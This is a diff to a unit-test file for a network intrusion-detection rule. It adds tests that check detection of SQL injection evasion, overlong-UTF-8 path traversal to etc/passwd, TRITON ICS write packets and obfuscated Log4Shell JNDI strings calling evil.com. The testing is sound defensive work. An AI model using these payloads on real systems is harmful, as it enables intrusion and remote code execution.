@@ -199,7 +199,7 @@ class TestPayloadRule(unittest.TestCase):
         suffix.update(tcp_flags=0x18, tcp_seq=1018)
         alert = self.rule.check(suffix)
         self.assertIsNotNone(alert)
-        self.assertEqual(alert["rule_version"], "1.23")
+        self.assertEqual(alert["rule_version"], "1.24")
         self.assertIn("SQL_INJECTION", [hit["signature"] for hit in alert["evidence"]["hits"]])
 
     def test_retransmitted_syn_does_not_reset_current_tcp_stream(self):
@@ -661,7 +661,7 @@ class TestPayloadRule(unittest.TestCase):
                 pkt = self.packet(payload, 5404)
                 alert = rule.check(pkt)
                 self.assertIsNotNone(alert)
-                self.assertEqual(alert["rule_version"], "1.23")
+                self.assertEqual(alert["rule_version"], "1.24")
                 self.assertIn("SSRF", [hit["signature"] for hit in alert["evidence"]["hits"]])
 
     def test_usr_bin_bash_cmd_injection_detected(self):
@@ -678,7 +678,7 @@ class TestPayloadRule(unittest.TestCase):
                 pkt = self.packet(cmd, 5405)
                 alert = rule.check(pkt)
                 self.assertIsNotNone(alert)
-                self.assertEqual(alert["rule_version"], "1.23")
+                self.assertEqual(alert["rule_version"], "1.24")
                 self.assertIn("CMD_INJECTION", [hit["signature"] for hit in alert["evidence"]["hits"]])
 
     def test_mssql_and_memcached_dpi_ports_inspected(self):
@@ -693,7 +693,7 @@ class TestPayloadRule(unittest.TestCase):
         }
         alert = rule.check(mssql_pkt)
         self.assertIsNotNone(alert, "Payload on MSSQL port 1433 should be inspected")
-        self.assertEqual(alert["rule_version"], "1.23")
+        self.assertEqual(alert["rule_version"], "1.24")
         self.assertIn("SQL_INJECTION", [hit["signature"] for hit in alert["evidence"]["hits"]])
 
         # Memcached port 11211 command injection
@@ -706,8 +706,197 @@ class TestPayloadRule(unittest.TestCase):
         }
         alert2 = rule.check(memcached_pkt)
         self.assertIsNotNone(alert2, "Payload on Memcached port 11211 should be inspected")
-        self.assertEqual(alert2["rule_version"], "1.23")
+        self.assertEqual(alert2["rule_version"], "1.24")
         self.assertIn("CMD_INJECTION", [hit["signature"] for hit in alert2["evidence"]["hits"]])
+
+    def test_payload_prune_stale_optional_now_and_stale_eviction(self):
+        rule = PayloadRule()
+        flow_key = ("192.168.1.100", "192.168.1.10", "TCP", 80)
+        cooldown_key_stale = (flow_key, "SQL_INJECTION", "UNION SELECT")
+        cooldown_key_valid = (flow_key, "SQL_INJECTION", "SELECT *")
+
+        rule._alerted[cooldown_key_stale] = 10.0   # expired (< 1000 - 60)
+        rule._alerted[cooldown_key_valid] = 980.0  # active within window
+
+        # Prune with now=1000.0:
+        # Stale entry should be removed, active entry retained
+        rule.prune_stale(now=1000.0)
+        self.assertNotIn(cooldown_key_stale, rule._alerted)
+        self.assertIn(cooldown_key_valid, rule._alerted)
+
+        # prune_stale without explicit now (defaults to time.time())
+        rule.prune_stale()
+
+    def test_sqli_whitespace_evasion_union_select_parentheses(self):
+        """Verifies detection of SQLi using parentheses instead of whitespace (EV-03)."""
+        rule = PayloadRule()
+        pkt = {
+            "type": "IP", "protocol": "TCP", "src_ip": "192.168.1.5", "dst_ip": "192.168.1.1",
+            "src_port": 54321, "dst_port": 80, "payload": b"GET /users?id=1 UNION(SELECT(1)) HTTP/1.1\r\n\r\n", "timestamp": 100.0
+        }
+        alert = rule.check(pkt)
+        self.assertIsNotNone(alert, "UNION(SELECT(1)) must be detected without whitespace")
+        sigs = [hit["signature"] for hit in alert["evidence"]["hits"]]
+        self.assertIn("SQL_INJECTION", sigs)
+
+    def test_path_traversal_overlong_slash_c0_af(self):
+        """Verifies detection of path traversal using overlong UTF-8 slash %c0%af (EV-04)."""
+        rule = PayloadRule()
+        pkt = {
+            "type": "IP", "protocol": "TCP", "src_ip": "192.168.1.5", "dst_ip": "192.168.1.1",
+            "src_port": 54321, "dst_port": 80, "payload": b"GET /..%c0%af..%c0%afetc/passwd HTTP/1.1\r\n\r\n", "timestamp": 100.0
+        }
+        alert = rule.check(pkt)
+        self.assertIsNotNone(alert, "Overlong slash %c0%af must be detected as PATH_TRAVERSAL")
+        sigs = [hit["signature"] for hit in alert["evidence"]["hits"]]
+        self.assertIn("PATH_TRAVERSAL", sigs)
+
+    def test_http_method_tampering_bare_lf(self):
+        """Verifies detection of HTTP method tampering preceded by bare LF rather than CRLF (EV-04)."""
+        rule = PayloadRule()
+        pkt = {
+            "type": "IP", "protocol": "TCP", "src_ip": "192.168.1.5", "dst_ip": "192.168.1.1",
+            "src_port": 54321, "dst_port": 80, "payload": b"X-Pad: foo\nTRACE / HTTP/1.1\n\n", "timestamp": 100.0
+        }
+        alert = rule.check(pkt)
+        self.assertIsNotNone(alert, "TRACE method preceded by bare LF must be detected")
+        sigs = [hit["signature"] for hit in alert["evidence"]["hits"]]
+        self.assertIn("HTTP_METHOD_TAMPERING", sigs)
+
+    def test_ics_tristation_exploit_payload_on_udp_1502(self):
+        """Verifies detection of Schneider Electric Triconex TriStation 1131 program injection (TRITON)."""
+        rule = PayloadRule()
+        # Header: \x05\x00 (TriStation), 2 bytes length, 2 bytes flags, Function Code \x42 (Write Program)
+        triton_write_pkt = {
+            "type": "IP", "protocol": "UDP", "src_ip": "192.168.1.88", "dst_ip": "192.168.1.2",
+            "src_port": 33279, "dst_port": 1502,
+            "payload": b"\x05\x00\x00\x18\x00\x00\x42" + b"\x00" * 20,
+            "timestamp": 100.0,
+        }
+        alert = rule.check(triton_write_pkt)
+        self.assertIsNotNone(alert, "TriStation function code 0x42 on UDP port 1502 must trigger ICS alert")
+        sigs = [hit["signature"] for hit in alert["evidence"]["hits"]]
+        self.assertIn("ICS_TRISTATION_EXPLOIT", sigs)
+
+
+    def test_log4shell_standard_and_obfuscated_variants(self):
+        """Verifies detection of Log4Shell across standard, nested-obfuscated, and URL-encoded forms."""
+        rule = PayloadRule()
+        test_payloads = [
+            b"${jndi:ldap://192.168.1.100:1389/Exploit}",
+            b"${${lower:j}ndi:ldap://evil.com/x}",
+            b"${${upper:j}ndi:ldap://evil.com/x}",
+            b"${${::-j}${::-n}${::-d}${::-i}:ldap://evil.com/x}",
+            b"${${:-j}${:-n}${:-d}${:-i}:ldap://evil.com/x}",
+            b"${${:-j}ndi:ldap://evil.com/x}",
+            b"GET /login?q=%24%7B%24%7B%3A%3A-j%7D%24%7B%3A%3A-n%7D%24%7B%3A%3A-d%7D%24%7B%3A%3A-i%7D%3Aldap%3A%2F%2Fevil.com%2Fa%7D HTTP/1.1\r\n\r\n",
+        ]
+        for idx, payload in enumerate(test_payloads):
+            pkt = {
+                "type": "IP", "protocol": "TCP", "src_ip": f"192.168.1.{10+idx}", "dst_ip": "192.168.1.2",
+                "src_port": 50000 + idx, "dst_port": 8080, "payload": payload, "timestamp": 200.0 + idx
+            }
+            alert = rule.check(pkt)
+            self.assertIsNotNone(alert, f"Log4Shell payload variant {idx} failed to fire: {payload!r}")
+            sigs = [hit["signature"] for hit in alert["evidence"]["hits"]]
+            self.assertIn("LOG4SHELL", sigs)
+            self.assertEqual(alert["severity"], "high")
+
+    def test_log4shell_benign_environment_variable_does_not_fire(self):
+        """Ensures ordinary environment variable references (${PORT}, ${USER}) do not trigger LOG4SHELL."""
+        rule = PayloadRule()
+        pkt = {
+            "type": "IP", "protocol": "TCP", "src_ip": "192.168.1.50", "dst_ip": "192.168.1.2",
+            "src_port": 51234, "dst_port": 80,
+            "payload": b"POST /config HTTP/1.1\r\nHost: example.com\r\n\r\nlisten_port=${PORT}\nuser=${USER}\n",
+            "timestamp": 300.0,
+        }
+        alert = rule.check(pkt)
+        if alert:
+            sigs = [hit["signature"] for hit in alert["evidence"]["hits"]]
+            self.assertNotIn("LOG4SHELL", sigs)
+
+
+    def test_benign_mime_multipart_boundaries_do_not_fire_sqli(self):
+        """Verifies that RFC 2046 MIME closing boundaries (--boundary--\r\n) do not trigger SQL_INJECTION."""
+        rule = PayloadRule()
+        # 1. SMTP mail body on port 587 with MIME closing boundary
+        smtp_pkt = {
+            "type": "IP", "protocol": "TCP",
+            "src_ip": "192.168.1.105", "dst_ip": "212.55.154.44",
+            "src_port": 54120, "dst_port": 587,
+            "payload": b"Content-Type: multipart/mixed; boundary=\"_004_abc_\"\r\n\r\n--_004_abc_\r\nHello\r\n--_004_abc_--\r\n",
+            "timestamp": 400.0,
+        }
+        alert = rule.check(smtp_pkt)
+        self.assertIsNone(alert, "Benign MIME multipart closing boundary on SMTP must not trigger alert")
+
+        # 2. HTTP multipart file upload on port 80 with boundary ending in --\r\n
+        http_upload_pkt = {
+            "type": "IP", "protocol": "TCP",
+            "src_ip": "192.168.1.105", "dst_ip": "192.168.1.200",
+            "src_port": 54122, "dst_port": 80,
+            "payload": (
+                b"POST /upload HTTP/1.1\r\nHost: target\r\nContent-Type: multipart/form-data; boundary=---------------------------12345\r\n\r\n"
+                b"-----------------------------12345\r\nContent-Disposition: form-data; name=\"file\"; filename=\"photo.jpg\"\r\n\r\n"
+                b"IMAGE_BYTES\r\n"
+                b"-----------------------------12345--\r\n"
+            ),
+            "timestamp": 401.0,
+        }
+        alert2 = rule.check(http_upload_pkt)
+        if alert2:
+            sigs = [hit["signature"] for hit in alert2["evidence"]["hits"]]
+            self.assertNotIn("SQL_INJECTION", sigs, "Multipart form boundary must not trigger SQL_INJECTION")
+
+    def test_http_response_direction_suppresses_injection_alerts(self):
+        """Verifies that HTTP server responses (reflected text, JS libraries) do not trigger client injection alerts."""
+        rule = PayloadRule()
+        resp_pkt = {
+            "type": "IP", "protocol": "TCP",
+            "src_ip": "192.168.1.200", "dst_ip": "192.168.1.105",
+            "src_port": 80, "dst_port": 54122,
+            "payload": (
+                b"HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n"
+                b"<html>Search results for: &lt;script&gt;alert(1)&lt;/script&gt; "
+                b"SQL: SELECT * FROM products WHERE category = 'books'</html>"
+            ),
+            "timestamp": 402.0,
+        }
+        alert = rule.check(resp_pkt)
+        self.assertIsNone(alert, "HTTP server responses must be suppressed to prevent reflection false positives")
+
+    def test_credential_redaction_in_evidence(self):
+        """Verifies that sensitive credentials matched in evidence are redacted."""
+        rule = PayloadRule()
+        pkt = {
+            "type": "IP", "protocol": "TCP",
+            "src_ip": "192.168.1.5", "dst_ip": "192.168.1.1",
+            "src_port": 54321, "dst_port": 80,
+            "payload": b"POST /login HTTP/1.1\r\n\r\nusername=admin&password=SuperSecretPassword123!\r\n",
+            "timestamp": 403.0,
+        }
+        alert = rule.check(pkt)
+        self.assertIsNotNone(alert)
+        cred_hits = [hit for hit in alert["evidence"]["hits"] if hit["signature"] == "CREDENTIAL_LEAK"]
+        self.assertTrue(len(cred_hits) > 0)
+        for hit in cred_hits:
+            match_str = hit.get("matched", "")
+            self.assertNotIn("SuperSecretPassword123!", match_str)
+            self.assertIn("[REDACTED]", match_str)
+
+    def test_mail_protocol_context_excludes_web_sqli_xss(self):
+        """Verifies that raw non-HTTP SMTP traffic on mail ports does not evaluate web SQLi/XSS."""
+        rule = PayloadRule()
+        mail_pkt = {
+            "type": "IP", "protocol": "TCP",
+            "src_ip": "192.168.1.50", "dst_ip": "212.55.154.44",
+            "src_port": 45000, "dst_port": 587,
+            "payload": b"Subject: Meeting Notes\r\n\r\nHere is the report: <script> alert </script> ' OR '1'='1 --\r\n",
+            "timestamp": 404.0,
+        }
+        alert = rule.check(mail_pkt)
+        self.assertIsNone(alert, "Non-HTTP mail body should not evaluate web SQLi or XSS")
 
 
 if __name__ == "__main__":
